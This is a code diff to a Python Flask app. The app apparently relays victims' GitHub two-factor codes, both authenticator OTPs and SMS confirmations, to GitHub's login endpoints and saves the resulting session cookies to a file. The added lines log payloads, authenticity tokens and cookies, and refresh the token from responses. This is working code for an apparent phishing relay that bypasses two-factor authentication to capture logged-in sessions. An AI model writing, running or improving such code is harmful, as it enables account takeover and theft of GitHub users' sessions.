@@ -159,14 +159,15 @@ def forward_sms():
     return response.text
 
 
-def execute_2fa_otp(app_otp: int, field_name:str):
+def execute_2fa_otp(app_otp: int, field_name: str):
     token = flask_session.get("authenticity_token")
     if not token:
-        return "Missing authenticity token.", "error"
+        print("Error: Missing authenticity token.")
+        return "Missing authenticity token.", "error", {}
 
     payload = {
         "authenticity_token": token,
-        field_name: app_otp,
+        field_name: app_otp,  # Use "app_otp" or "sms_otp" based on the field_name
         "webauthn-support": "supported",
         "webauthn-iuvpaa-support": "unsupported",
         "return_to": "",
@@ -174,31 +175,37 @@ def execute_2fa_otp(app_otp: int, field_name:str):
         "device_id": flask_session.get("device_id"),
     }
 
-    post_resp = req_session.post("https://github.com/sessions/two-factor", data=payload)
-    html = post_resp.text
+    print(f"Submitting OTP with Payload: {payload}")
+    print(f"Session Cookies Before OTP Submission: {req_session.cookies.get_dict()}")
+    print(f"Authenticity Token: {token}")
 
-    save_cookies_to_file()
-    print("Session cookies:", req_session.cookies.get_dict())
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Referer": "https://github.com/sessions/two-factor",
+        "Origin": "https://github.com",
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
 
-    soup = BeautifulSoup(html, "html.parser")
+    post_resp = req_session.post("https://github.com/sessions/two-factor", data=payload, headers=headers)
+    print(f"OTP Response Status Code: {post_resp.status_code}")
+    print(f"OTP Response HTML: {post_resp.text[:500]}")  # Print the first 500 characters for debugging
+
+    soup = BeautifulSoup(post_resp.text, "html.parser")
     page_title = soup.title.string.strip()  # Extract and clean the title
 
-    # Compare the title to determine success or failure
     if page_title == "GitHub":
-        return html, "success", req_session.cookies.get_dict()
+        return post_resp.text, "success", req_session.cookies.get_dict()
     elif page_title == "Two-factor authentication · GitHub":
-        return html, "failure", req_session.cookies.get_dict()
+        return post_resp.text, "failure", req_session.cookies.get_dict()
     else:
-        return html, "unknown", req_session.cookies.get_dict()
-
+        return post_resp.text, "unknown", req_session.cookies.get_dict()
 
 def send_sms(authenticity_token, resend):
-    # Forward the request to GitHub
     headers = {
         "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
         "Accept": "text/html,application/xhtml+xml,application/json",
         "Accept-Encoding": "gzip, deflate, br, zstd",
-        "Accept-Language": "pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3",
+        "Accept-Language": "en-US,en;q=0.5",
         "Referer": "https://github.com/sessions/two-factor/sms/confirm",
         "Origin": "https://github.com",
         "Sec-Fetch-Dest": "empty",
@@ -211,12 +218,28 @@ def send_sms(authenticity_token, resend):
         "resend": resend,
     }
 
-    response = req_session.post(
-        "https://github.com/sessions/two-factor/sms/confirm",
-        headers=headers,
-        data=payload,
-    )
+    print(f"Sending SMS 2FA Request with Payload: {payload}")
+    print(f"Headers Sent for SMS 2FA: {headers}")
 
-    # Save cookies after forwarding the request
+    response = req_session.post(
+        "https://github.com/sessions/two-factor/sms/confirm", headers=headers, data=payload
+    )
     save_cookies_to_file()
+
+    print(f"SMS 2FA Response Status Code: {response.status_code}")
+    print(f"SMS 2FA Response HTML: {response.text[:500]}")  # Print the first 500 characters
+    print(f"Session Cookies After SMS 2FA Request: {req_session.cookies.get_dict()}")
+
+    if response.status_code != 200:
+        print("Error: Received status code", response.status_code)
+        return f"Error: {response.status_code}"
+
+    soup = BeautifulSoup(response.text, "html.parser")
+    token_input = soup.find("input", {"name": "authenticity_token"})
+    if token_input and token_input.has_attr("value"):
+        flask_session["authenticity_token"] = token_input["value"]
+        print(f"Updated Authenticity Token: {flask_session['authenticity_token']}")
+    else:
+        print("Error: Could not find authenticity token in SMS 2FA response.")
+
     return response.text
